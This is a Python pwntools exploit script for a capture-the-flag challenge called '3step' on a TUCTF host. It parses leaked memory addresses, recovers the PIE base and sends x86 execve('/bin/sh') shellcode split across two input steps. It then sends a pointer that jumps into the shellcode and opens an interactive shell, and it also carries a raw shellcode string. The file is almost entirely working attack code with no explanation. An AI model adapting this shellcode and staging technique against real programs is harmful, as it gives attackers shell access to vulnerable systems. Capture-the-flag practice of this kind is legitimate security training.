#!/usr/bin/env python2
from pwn import *
from mypwntools import * # ~/workspace/tools/mypwntools/
import logging
import coloredlogs
# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)

coloredlogs.install()
log = logging.getLogger("Exploit")

#context.log_level = 'debug'
context.terminal = ['alacritty', '-e', 'sh', '-c']
context.arch = 'x86'

BINARY = "./3step"
HOST, PORT = 'chal.tuctf.com', 30504
LIBC_PATH = '/usr/lib/libc.so.6'

GDB_SETUP = """
set follow-fork-mode child
# c
"""

if '--live' not in sys.argv:
    p = process(BINARY)
    if '--debug' in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)
binary = ELF(BINARY)

buf_1_offset = 0x400c
pwnme_offset = 0x11d9

p.recvuntil("snacks\n")
bss_buf_addr = gethex(p.recvline())
stack_buf_addr = gethex(p.recvline())
print(hex(bss_buf_addr))
print(hex(stack_buf_addr))

pie_base = bss_buf_addr - buf_1_offset
pwnme = pwnme_offset + pie_base
a_shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80";

p.recvuntil("Step 1:")
# Read 0x12 into bss
payload = asm('xor eax, eax; cdq; push eax; push 0x68732f2f; push {}; pop ebx; jmp ebx'.format(hex(stack_buf_addr)))
print(len(payload))
#payload = a_shellcode[2:]
p.sendline(payload)

p.recvuntil("Step 2:")
# Read 0x10 into stack
payload = asm('push 0x6e69622f; mov  ebx, esp; push eax; push ebx; mov ecx, esp; mov al, 0x0b; int  0x80;')
print(len(payload))
p.sendline(payload)

p.recvuntil("Step 3:")
# Read function pointer to call
payload = p32(pwnme)
payload = p32(bss_buf_addr)
p.sendline(payload)


p.interactive()

